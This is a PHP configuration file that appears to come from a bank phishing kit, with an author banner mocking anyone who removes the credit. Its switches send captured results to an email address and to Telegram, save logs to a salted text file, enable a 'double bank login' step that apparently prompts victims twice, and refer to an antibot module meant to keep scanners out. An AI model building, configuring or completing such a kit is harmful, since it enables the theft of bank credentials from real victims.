<?php

// ------------------------------------------------- //
  #                BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//


//important details
$emailzz = ""; // whykkaymailbox@pupsikaneto.ml
$salt = "9SWA"; // File name to secure logs

//important on/off
$d_log = "on"; // double bank login
$savetxt = "on"; // to turn on/off save log txt file

$tgresult = "on"; // to get result on tg

// to turn zsec(server side antibot) off goto zsec-config.php
?>
